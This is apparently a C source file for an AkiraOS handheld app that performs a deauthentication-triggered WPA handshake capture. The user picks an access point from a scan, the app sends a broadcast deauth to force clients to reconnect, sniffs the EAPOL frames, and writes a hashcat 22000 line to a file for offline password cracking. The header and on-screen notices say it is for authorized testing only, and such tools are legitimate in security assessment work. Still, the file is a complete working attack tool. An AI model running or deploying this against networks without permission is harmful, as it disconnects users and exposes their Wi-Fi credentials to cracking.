/*
 * wifi_capture — Deauth-triggered WPA handshake capture for AkiraOS
 *
 * FOR AUTHORIZED USE ONLY — use only on networks you own or have
 * explicit written permission to test.
 *
 * Flow:
 *   SCAN → scan for APs → LIST → select AP →
 *   CONFIRM (2 s hold) → CAPTURE (deauth + sniff EAPOL) →
 *   DONE (show hash / timeout)
 *
 * Controls (all screens):
 *   UP / DOWN  — navigate list
 *   A          — confirm / advance
 *   B          — back / cancel / rescan (LIST screen)
 */

#include "akira_api.h"
#include "../../common/akira_ui.h"
#include <stdint.h>

/* ── Limits ─────────────────────────────────────────────────────────────── */

#define MAX_APS         32
#define HOLD_DURATION   2000u    /* ms hold required on CONFIRM screen */
#define CAPTURE_TIMEOUT 12000    /* ms to wait for EAPOL after deauth */

/* hashcat 22000 line assembly */
#define EAPOL_MIC_OFFSET 81      /* byte offset of MIC field within EAPOL frame */
#define EAPOL_MIC_LEN    16
#define HS_MESSAGE_PAIR  "00"    /* messagepair: M1+M2 pairing */
#define HASH_LINE_CAP    768     /* worst case: 256-byte EAPOL -> 512 hex + fields */
#define CAPTURE_NAME_CAP 48      /* 32-char SSID + "_capture.txt" + NUL */
#define CAPTURE_SUFFIX   "_capture.txt"

/* ── States ─────────────────────────────────────────────────────────────── */

#define STATE_SCAN      0
#define STATE_LIST      1
#define STATE_CONFIRM   2
#define STATE_CAPTURE   3
#define STATE_DONE      4

/* ── Display geometry ───────────────────────────────────────────────────── */

static int32_t DW = 320;
static int32_t DH = 240;
#define HDR_H    16
#define ROW_H    14
#define FOT_H    14
#define FOT_Y    (DH - FOT_H)

#define COL_BG   CONSOLE_COLOR_BG
#define COL_HDR  CONSOLE_COLOR_HEADER
#define COL_SEP  CONSOLE_COLOR_SEP
#define COL_TXT  CONSOLE_COLOR_TEXT
#define COL_DIM  CONSOLE_COLOR_DIM
#define COL_ACC  CONSOLE_COLOR_ACCENT
#define COL_OK   CONSOLE_COLOR_OK
#define COL_WARN CONSOLE_COLOR_WARN
#define COL_ERR  CONSOLE_COLOR_ERR
#define COL_SEL  CONSOLE_COLOR_SEL_BG

/* ── String helpers ─────────────────────────────────────────────────────── */

static int my_strlen(const char *s)
{
    int n = 0;
    while (s[n]) n++;
    return n;
}

static void my_itoa(int v, char *buf, int buflen)
{
    if (buflen < 2) return;
    if (v < 0) { buf[0] = '-'; v = -v; buf++; buflen--; }
    char tmp[12];
    int n = 0;
    if (v == 0) { tmp[n++] = '0'; }
    while (v > 0 && n < 11) { tmp[n++] = '0' + v % 10; v /= 10; }
    int out = n < buflen - 1 ? n : buflen - 1;
    for (int i = 0; i < out; i++) buf[i] = tmp[n - 1 - i];
    buf[out] = '\0';
}

/* Format a 6-byte MAC as "AA:BB:CC:DD:EE:FF" into buf (must be >=18 bytes) */
static void fmt_mac(const uint8_t *mac, char *buf)
{
    static const char hex[] = "0123456789ABCDEF";
    for (int i = 0; i < 6; i++) {
        buf[i*3]   = hex[(mac[i] >> 4) & 0xF];
        buf[i*3+1] = hex[mac[i] & 0xF];
        buf[i*3+2] = (i < 5) ? ':' : '\0';
    }
    buf[17] = '\0';
}

/* Format RSSI as e.g. "-72" */
static void fmt_rssi(int8_t rssi, char *buf, int len)
{
    if (rssi == 0) { buf[0]='?'; buf[1]='\0'; return; }
    my_itoa((int)rssi, buf, len);
}

/* Format N bytes as hex chars into buf (buf must be >= n*2+1) */
static void fmt_hex(const uint8_t *data, int n, char *buf)
{
    static const char hex[] = "0123456789ABCDEF";
    for (int i = 0; i < n; i++) {
        buf[i*2]   = hex[(data[i] >> 4) & 0xF];
        buf[i*2+1] = hex[data[i] & 0xF];
    }
    buf[n*2] = '\0';
}

/* ── Globals ─────────────────────────────────────────────────────────────── */

static int   g_state = STATE_SCAN;
static int   g_needs_redraw = 1;

/* AP list */
static akira_wifi_ap_t g_aps[MAX_APS];
static int             g_ap_count;
static int             g_sel;
static int             g_scroll;
static char            g_scan_status[48];

/* Selected AP */
static akira_wifi_ap_t g_target_ap;

/* Capture result */
static handshake_capture_result_t g_result;
static char g_status_msg[48];
static char g_hash_line[HASH_LINE_CAP];
static char g_capture_name[CAPTURE_NAME_CAP];
static uint32_t g_hold_start;

/* Security-type short label */
static const char *sec_label(uint8_t sec)
{
    switch (sec) {
    case WIFI_SEC_OPEN: return "OPEN";
    case WIFI_SEC_WEP:  return "WEP ";
    case WIFI_SEC_WPA:  return "WPA ";
    case WIFI_SEC_WPA2: return "WPA2";
    case WIFI_SEC_WPA3: return "WPA3";
    case WIFI_SEC_ENT:  return "ENT ";
    default:            return "?   ";
    }
}

/* ── Screen renderers ────────────────────────────────────────────────────── */

static void draw_hdr(const char *title)
{
    display_rect(0, 0, DW, HDR_H, COL_BG);
    display_text(4, 3, title, COL_TXT);
}

static void draw_footer(const char *hint)
{
    display_rect(0, FOT_Y, DW, FOT_H, COL_BG);
    display_text(4, FOT_Y + 2, hint, COL_DIM);
}

static void draw_bar(int y, int h, uint32_t done, uint32_t total, uint16_t col)
{
    int w = total > 0 ? (int)((uint32_t)(DW - 8) * done / total) : 0;
    display_rect_outline(4, y, DW - 8, h, COL_TXT);
    if (w > 0) display_rect(4, y, w, h, col);
}

static void draw_scan(void)
{
    draw_hdr("WIFI PMKID — SCANNING");
    display_rect(0, HDR_H, DW, DH - HDR_H - FOT_H, COL_BG);
    display_text(8, HDR_H + 16, g_scan_status[0] ? g_scan_status : "Scanning...", COL_DIM);
    draw_footer("Please wait...");
}

static void draw_list(void)
{
    draw_hdr("WIFI PMKID — SELECT AP");
    display_rect(0, HDR_H, DW, DH - HDR_H - FOT_H, COL_BG);

    int rows = (DH - HDR_H - FOT_H) / ROW_H;

    if (g_ap_count == 0) {
        display_text(8, HDR_H + 12, "No APs found.", COL_DIM);
        display_text(8, HDR_H + 28, "[B] to rescan", COL_DIM);
    }

    for (int i = 0; i < rows && (i + g_scroll) < g_ap_count; i++) {
        int idx = i + g_scroll;
        const akira_wifi_ap_t *ap = &g_aps[idx];
        int y   = HDR_H + i * ROW_H;
        int sel = (idx == g_sel);
        display_rect(0, y, DW, ROW_H, sel ? COL_TXT : COL_BG);

        char ssid[21];
        int slen = my_strlen((const char *)ap->ssid);
        if (slen > 20) slen = 20;
        for (int j = 0; j < slen; j++) ssid[j] = (char)ap->ssid[j];
        ssid[slen] = '\0';
        display_text(8, y + 3, ssid, sel ? COL_BG : COL_DIM);

        char info[24];
        char rssi_s[6];
        fmt_rssi(ap->rssi, rssi_s, sizeof(rssi_s));
        char ch_s[4];
        my_itoa(ap->channel, ch_s, sizeof(ch_s));
        int ip = 0;
        info[ip++]='c'; info[ip++]='h';
        for (int j = 0; ch_s[j]; j++) info[ip++] = ch_s[j];
        info[ip++]=' ';
        for (int j = 0; rssi_s[j]; j++) info[ip++] = rssi_s[j];
        info[ip++]='d'; info[ip++]='B'; info[ip++]='m'; info[ip++]=' ';
        const char *sl = sec_label(ap->security);
        for (int j = 0; sl[j]; j++) info[ip++] = sl[j];
        info[ip] = '\0';
        display_text(DW - 112, y + 3, info, sel ? COL_BG : COL_DIM);
    }

    draw_footer("[A]Select [B]Rescan [UP/DN]Nav");
}

static void draw_confirm(void)
{
    draw_hdr("WIFI PMKID — CONFIRM");
    display_rect(0, HDR_H, DW, DH - HDR_H - FOT_H, COL_BG);

    int y = HDR_H + 8;
    char mac_s[18];
    fmt_mac(g_target_ap.bssid, mac_s);

    display_text(8, y, "AP:", COL_DIM);
    display_text(28, y, (const char *)g_target_ap.ssid, COL_WARN);
    y += ROW_H;
    display_text(8, y, "BSSID:", COL_DIM);
    display_text(52, y, mac_s, COL_DIM);
    y += ROW_H;
    display_text(8, y, "Security:", COL_DIM);
    display_text(64, y, sec_label(g_target_ap.security), COL_DIM);
    y += ROW_H;
    display_text(8, y, "Channel:", COL_DIM);
    char ch_s[4]; my_itoa(g_target_ap.channel, ch_s, sizeof(ch_s));
    display_text(64, y, ch_s, COL_DIM);
    y += ROW_H + 4;

    display_rect(0, y, DW, 1, COL_SEP);
    y += 6;
    display_text(8, y, "Deauth client + sniff", COL_DIM);
    y += ROW_H;
    display_text(8, y, "EAPOL-Key M1 for PMKID", COL_DIM);
    y += ROW_H + 4;

    display_text(8, y, "AUTHORIZED USE ONLY", COL_WARN);
    y += ROW_H;
    display_text(8, y, "Hold [A] 2s to start", COL_WARN);
    y += ROW_H + 6;

    uint32_t now  = (uint32_t)rtc_get_uptime_ms();
    uint32_t held = (g_hold_start && now > g_hold_start) ? now - g_hold_start : 0;
    if (held > HOLD_DURATION) held = HOLD_DURATION;
    draw_bar(y, 10, held, HOLD_DURATION, COL_WARN);

    draw_footer("[A]Hold to confirm [B]Cancel");
}

static void draw_capture(void)
{
    draw_hdr("WIFI PMKID — CAPTURING");
    display_rect(0, HDR_H, DW, DH - HDR_H - FOT_H, COL_BG);

    int y = HDR_H + 10;

    display_text(8, y, (const char *)g_target_ap.ssid, COL_ACC);
    y += ROW_H + 4;

    display_text(8, y, "Deauth sent...", COL_DIM);
    y += ROW_H;
    display_text(8, y, "Waiting for EAPOL...", COL_DIM);
    y += ROW_H + 8;

    display_rect(0, y, DW, 1, COL_SEP);
    y += 6;
    display_text(8, y, "Client should reconnect", COL_DIM);
    y += ROW_H;
    display_text(8, y, "automatically", COL_DIM);
    y += ROW_H + 8;

    /* Animated progress bar */
    uint32_t elapsed = (uint32_t)(rtc_get_uptime_ms() % CAPTURE_TIMEOUT);
    draw_bar(y, 10, elapsed, CAPTURE_TIMEOUT, COL_ACC);

    draw_footer("[B]Abort");
}

/* Build hashcat 22000 line (WPA*02 9-field EAPOL M1+M2 format) into out.
 * Returns length written. */
static int build_hashcat_line(char *out, int cap)
{
    char mic[33], ap[13], sta[13], a[65], frame_hex[513];
    fmt_hex(g_result.mic,    16, mic);
    fmt_hex(g_result.ap_mac,  6, ap);
    fmt_hex(g_result.sta_mac, 6, sta);
    fmt_hex(g_result.anonce, 32, a);
    fmt_hex(g_result.eapol_frame, (int)g_result.eapol_len, frame_hex);

    /* hashcat zeroes the MIC field before computing, so the EAPOL frame it
     * receives must carry a zeroed MIC or verification fails. */
    if ((int)g_result.eapol_len >= EAPOL_MIC_OFFSET + EAPOL_MIC_LEN) {
        for (int i = 0; i < EAPOL_MIC_LEN * 2; i++)
            frame_hex[EAPOL_MIC_OFFSET * 2 + i] = '0';
    }

    /* SSID as hex (UPPERCASE) */
    char ssid_hex[66];
    int sl = 0;
    while (g_result.ssid[sl] && sl < 32) sl++;
    for (int i = 0; i < sl; i++) {
        static const char *h = "0123456789ABCDEF";
        ssid_hex[i*2]   = h[(g_result.ssid[i] >> 4) & 0xF];
        ssid_hex[i*2+1] = h[g_result.ssid[i] & 0xF];
    }
    ssid_hex[sl*2] = '\0';

    /* WPA*02*MIC*APMAC*STAMAC*SSID_HEX*ANONCE*EAPOL_HEX*MP */
    int p = 0;
    const char *field[] = { "WPA*02", mic, ap, sta, ssid_hex, a, frame_hex,
                            HS_MESSAGE_PAIR };
    for (int f = 0; f < (int)(sizeof(field)/sizeof(field[0])); f++) {
        if (f) { if (p < cap - 1) out[p++] = '*'; }
        for (int i = 0; field[f][i] && p < cap - 1; i++) out[p++] = field[f][i];
    }
    out[p] = '\0';
    return p;
}

static void draw_done(void)
{
    draw_hdr("WIFI PMKID — RESULT");
    display_rect(0, HDR_H, DW, DH - HDR_H - FOT_H, COL_BG);

    int y = HDR_H + 8;

    if (g_result.found) {
        build_hashcat_line(g_hash_line, sizeof(g_hash_line));

        display_text(8, y, "HANDSHAKE CAPTURED!", COL_OK);
        y += ROW_H + 4;

        /* Show SSID + first ~30 chars of hashcat line */
        display_text(8, y, "AP:", COL_DIM);
        display_text(28, y, (const char *)g_target_ap.ssid, COL_ACC);
        y += ROW_H;

        char anonce_str[65];
        fmt_hex(g_result.anonce, 32, anonce_str);
        display_text(8, y, "ANonce:", COL_DIM);
        display_text(60, y, anonce_str, COL_DIM);
        y += ROW_H + 4;

        display_text(8, y, "Saved:", COL_DIM);
        y += ROW_H + 4;
        display_text(8, y, g_capture_name, COL_ACC);
        y += ROW_H + 4;

        /* Show hashcat line (wraps if needed) */
        display_text(8, y, g_hash_line, COL_DIM);
        y += ROW_H;

        draw_bar(y, 8, 1, 1, COL_OK);
    } else {
        display_text(8, y, g_status_msg[0] ? g_status_msg : "No handshake captured", COL_WARN);
        y += ROW_H + 4;
        display_text(8, y, "Possible reasons:", COL_DIM);
        y += ROW_H;
        display_text(8, y, "- Client didn't reconnect", COL_DIM);
        y += ROW_H;
        display_text(8, y, "- AP doesn't support WPA2", COL_DIM);
        y += ROW_H;
        display_text(8, y, "- Wrong channel", COL_DIM);
    }

    draw_footer("[A/B]Back to list");
}

/* ── Scan ────────────────────────────────────────────────────────────────── */

static void do_scan(void)
{
    g_scan_status[0] = 'S'; g_scan_status[1] = 'c'; g_scan_status[2] = 'a';
    g_scan_status[3] = 'n'; g_scan_status[4] = 'n'; g_scan_status[5] = 'i';
    g_scan_status[6] = 'n'; g_scan_status[7] = 'g'; g_scan_status[8] = '.';
    g_scan_status[9] = '.'; g_scan_status[10] = '.'; g_scan_status[11] = '\0';
    g_needs_redraw = 1;
    draw_scan();
    display_flush();

    int n = wifi_scan_aps(g_aps, sizeof(g_aps));
    g_ap_count = (n > 0) ? (n < MAX_APS ? n : MAX_APS) : 0;
    g_sel      = 0;
    g_scroll   = 0;

    if (g_ap_count == 0) {
        g_scan_status[0]='N'; g_scan_status[1]='o'; g_scan_status[2]=' ';
        g_scan_status[3]='A'; g_scan_status[4]='P'; g_scan_status[5]='s';
        g_scan_status[6]='.'; g_scan_status[7]='\0';
    } else {
        char num[4]; my_itoa(g_ap_count, num, sizeof(num));
        int sp = 0;
        for (int j = 0; num[j]; j++) g_scan_status[sp++] = num[j];
        const char *suf = " APs found";
        for (int j = 0; suf[j]; j++) g_scan_status[sp++] = suf[j];
        g_scan_status[sp] = '\0';
    }

    g_state = STATE_LIST;
    g_needs_redraw = 1;
}

/* ── Save PMKID hash to file ─────────────────────────────────────────────── */

/* Build "<ssid>_capture.txt" into g_capture_name, mapping filesystem-unsafe
 * SSID bytes to '_'. */
static void build_capture_name(void)
{
    int p = 0;
    int cap = CAPTURE_NAME_CAP - (int)sizeof(CAPTURE_SUFFIX); /* room for suffix+NUL */
    for (int i = 0; g_result.ssid[i] && i < 32 && p < cap; i++) {
        char c = g_result.ssid[i];
        int ok = (c >= 'A' && c <= 'Z') || (c >= 'a' && c <= 'z') ||
                 (c >= '0' && c <= '9') || c == '-' || c == '_';
        g_capture_name[p++] = ok ? c : '_';
    }
    for (int i = 0; CAPTURE_SUFFIX[i]; i++) g_capture_name[p++] = CAPTURE_SUFFIX[i];
    g_capture_name[p] = '\0';
}

static void save_capture(void)
{
    if (!g_result.found) return;

    char hash_line[HASH_LINE_CAP];
    int p = build_hashcat_line(hash_line, sizeof(hash_line) - 1);
    hash_line[p++] = '\n';
    hash_line[p] = '\0';

    build_capture_name();

    /* Write to app sandbox */
    int fd = storage_open(g_capture_name, STORAGE_O_WRITE);
    if (fd < 0) {
        int sp = 0;
        const char *m = "Save failed";
        for (int i = 0; m[i]; i++) g_status_msg[sp++] = m[i];
        g_status_msg[sp] = '\0';
        return;
    }
    storage_write(fd, hash_line, p);
    storage_close(fd);
}

/* ── Entry point ──────────────────────────────────────────────────────────── */

int main(void)
{
    display_get_size(&DW, &DH);

    int prev_btns = 0;

    while (1) {
        /* Kick off scan on entry */
        if (g_state == STATE_SCAN) {
            do_scan();
        }

        /* ── Capture tick ── */
        if (g_state == STATE_CAPTURE) {
            int cap_ret = wifi_capture_pmkid(
                g_target_ap.bssid,
                WIFI_MAC_BROADCAST,
                (int32_t)g_target_ap.channel,
                (const char *)g_target_ap.ssid,
                &g_result,
                CAPTURE_TIMEOUT);

            if (cap_ret == 1 && g_result.found) {
                save_capture();
                int sp = 0;
                const char *m = "Handshake captured!";
                for (int i = 0; m[i]; i++) g_status_msg[sp++] = m[i];
                g_status_msg[sp] = '\0';
            } else {
                int sp = 0;
                const char *m = "Timeout - no handshake";
                for (int i = 0; m[i]; i++) g_status_msg[sp++] = m[i];
                g_status_msg[sp] = '\0';
            }
            g_state = STATE_DONE;
            g_needs_redraw = 1;
        }

        /* ── Input ── */
        int btns    = input_get_buttons();
        int pressed = btns & ~prev_btns;
        prev_btns   = btns;

        if (pressed) g_needs_redraw = 1;

        int rows = (DH - HDR_H - FOT_H) / ROW_H;

        switch (g_state) {

        case STATE_LIST:
            if (pressed & AKIRA_BTN_UP) {
                if (g_sel > 0) { g_sel--; if (g_sel < g_scroll) g_scroll = g_sel; }
            }
            if (pressed & AKIRA_BTN_DOWN) {
                if (g_sel < g_ap_count - 1) {
                    g_sel++;
                    if (g_sel >= g_scroll + rows) g_scroll = g_sel - rows + 1;
                }
            }
            if (pressed & AKIRA_BTN_B) {
                g_state = STATE_SCAN;
            }
            if ((pressed & AKIRA_BTN_A) && g_ap_count > 0) {
                g_target_ap = g_aps[g_sel];
                g_hold_start = 0;
                g_state = STATE_CONFIRM;
            }
            break;

        case STATE_CONFIRM: {
            if (pressed & AKIRA_BTN_B) {
                g_hold_start = 0;
                g_state = STATE_LIST;
            }
            if (pressed & AKIRA_BTN_A) {
                if (!g_hold_start) {
                    g_hold_start = rtc_get_uptime_ms();
                }
            }
            uint32_t now = rtc_get_uptime_ms();
            uint32_t held = (g_hold_start && now > g_hold_start) ? now - g_hold_start : 0;
            if (held >= HOLD_DURATION) {
                /* Safety dialog */
                bool ok = akira_ui_confirm_dialog("WIFI_PMKID",
                                                   "capture PMKID from AP?");
                if (ok) {
                    for (int i = 0; i < (int)sizeof(g_result); i++)
                        ((uint8_t *)&g_result)[i] = 0;
                    g_state = STATE_CAPTURE;
                } else {
                    g_hold_start = 0;
                }
                prev_btns = input_get_buttons();
            }
            if (!(btns & AKIRA_BTN_A)) {
                g_hold_start = 0;
            }
            /* Force redraw for progress bar */
            g_needs_redraw = 1;
            break;
        }

        case STATE_CAPTURE:
            /* Blocking — handled above */
            g_needs_redraw = 1;
            break;

        case STATE_DONE:
            if (pressed & (AKIRA_BTN_A | AKIRA_BTN_B)) {
                g_state = STATE_LIST;
            }
            break;

        default:
            break;
        }

        /* ── Redraw ── */
        if (g_needs_redraw) {
            switch (g_state) {
            case STATE_SCAN:    draw_scan();     break;
            case STATE_LIST:    draw_list();     break;
            case STATE_CONFIRM: draw_confirm();  break;
            case STATE_CAPTURE: draw_capture();  break;
            case STATE_DONE:    draw_done();     break;
            default: break;
            }
            display_flush();
            g_needs_redraw = 0;
        }

        delay(20);
    }

    return 0;
}
